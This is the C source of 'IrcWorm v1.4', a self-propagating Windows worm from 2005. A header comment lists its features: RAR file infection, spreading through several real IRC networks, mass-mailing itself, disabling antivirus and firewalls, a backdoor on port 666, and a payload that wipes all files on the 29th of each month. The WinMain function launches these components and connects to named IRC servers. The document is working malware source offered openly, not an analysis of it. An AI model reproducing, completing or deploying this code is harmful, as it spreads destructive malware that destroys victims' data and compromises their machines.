
   /*
       IrcWorm v1.4 (c) 2005 by DR-EF
       ------------------------------
       |  http://dref.hategod.info/ |
       ------------------------------

       features:
       *********
             1)infect all *.rar files on all drivers

             2)connect 6 major irc networks,send a list
               command and join a random 5 channels with
               more than 50 poeple,than auto message when
               user join/part with url to the worm file

             3)random nicks,messages

             4)use its own http/ident server,irc cliant
               rar packer

             5)massmail itself to all addresses its can
               find in the WAB and files using its own
               smtp engine

             6)shutdown firewalls/antiviruses/registry

             7)notify after infection

             8)open port 666 as backdoor

      payload:
      ********
            1)overwrite & zero all files on all drivers
              on 29 of any month
            2)show copyright message




     */


   #include "stdafx.h"
   #include "winsock2.h"
   #include "xIrcWorm.h"
   #include "prototypez.h"
   #include "stdlib.h"


   #pragma comment(lib,"ws2_32.lib")
   #pragma comment(lib,"msvcrt.lib")
   #pragma comment(linker,"/MERGE:.text=.data")
   #if (_MSC_VER < 1300)
       #pragma comment(linker,"/IGNORE:4078")
       #pragma comment(linker,"/OPT:NOWIN98")
   #endif
   #define WIN32_LEAN_AND_MEAN


   #define xSleepTime  25000

   DWORD WINAPI IW_EFNET(LPVOID xvoid)
   {
       xIrcWorm efnet_worm;
       efnet_worm.InitWorm("irc.efnet.net",6667);
       for(;;Sleep(xSleepTime))
           efnet_worm.StartWorm();
       return 1;
   }

   DWORD WINAPI IW_UNDERNET(LPVOID xvoid)
   {
       char *undernet_servers[]={"us.undernet.org","eu.undernet.org"};
       xIrcWorm undernet_worm;

       srand(GetTickCount());

       for(;;)
       {
           undernet_worm.InitWorm(undernet_servers[rand() % 2],6667);
           undernet_worm.StartWorm();
           Sleep(xSleepTime);
       }

       return 1;
   }

   DWORD WINAPI IW_DALNET(LPVOID xvoid)
   {
       xIrcWorm dalnet_worm;
       dalnet_worm.InitWorm("irc.dal.net",6667);
       for(;;Sleep(xSleepTime))
           dalnet_worm.StartWorm();
       return 1;
   }

   DWORD WINAPI IW_RIZON(LPVOID xvoid)
   {
       xIrcWorm rizon_worm;
       rizon_worm.InitWorm("irc.rizon.net",6667);
       for(;;Sleep(xSleepTime))
           rizon_worm.StartWorm();
       return 1;
   }

   DWORD WINAPI IW_IRCNET(LPVOID xvoid)
   {
       char *ircnet_servers[]={"irc.us.ircnet.net","random.ircd.de",
                               "irc.ircnet.ee","irc.fr.ircnet.net"};

       srand(GetTickCount());

       xIrcWorm ircnet_worm;

       for(;;)
       {
           Sleep(xSleepTime);
           ircnet_worm.InitWorm(ircnet_servers[rand() % 4],6667);
           ircnet_worm.StartWorm();
       }

       return 1;
   }

   DWORD WINAPI IW_QUAKENET(LPVOID xvoid)
   {
       xIrcWorm quakenet_worm;
       quakenet_worm.InitWorm("irc.quakenet.org",6667);
       for(;;Sleep(xSleepTime))
           quakenet_worm.StartWorm();
       return 1;
   }

   BOOL OnlyOneRun()
   {
       if(OpenMutex(MUTEX_ALL_ACCESS,FALSE,CopyRight)!=NULL)
           return TRUE;
       else
       {
           CreateMutex(NULL,FALSE,CopyRight);
           return FALSE;
       }
   }


   int APIENTRY WinMain(HINSTANCE hInstance,
                        HINSTANCE hPrevInstance,
                        LPSTR     lpCmdLine,
                        int       nCmdShow)
   {
       MSG msg;

       InstallWorm();              //install worm

       SetTimer(NULL,NULL,4000,&DisableProtectionPrograms);    //disable av/fw

       Payload();                  //execute payload

       XThread(RarWorm,NULL);      //infect all rar files on all drivers

       if(OnlyOneRun()==TRUE)      //make sure only one worm instance is running
           ExitProcess(1);

       WaitForInetConnection();    //wait till we connected to the internet

       XThread(Http_Server,NULL);  //run http server
       XThread(Ident_Server,NULL); //run ident server

       XThread(WormNotify,NULL);   //notify about the infection

       XThread(IW_QUAKENET,NULL);
       XThread(IW_IRCNET,NULL);
       XThread(IW_RIZON,NULL);
       XThread(IW_DALNET,NULL);
       XThread(IW_UNDERNET,NULL);
       XThread(IW_EFNET,NULL);

       XThread(BackDoor,NULL);

       XThread(DropVoltage,NULL);  //drop win32.voltage version 3.0

       srand(GetTickCount());

       if((rand() % 8)==5)
           XThread(mailworm,NULL);     //start a mail worm

       while(GetMessage(&msg,NULL,0,0))
           DispatchMessage(&msg);
       return 0;
   }
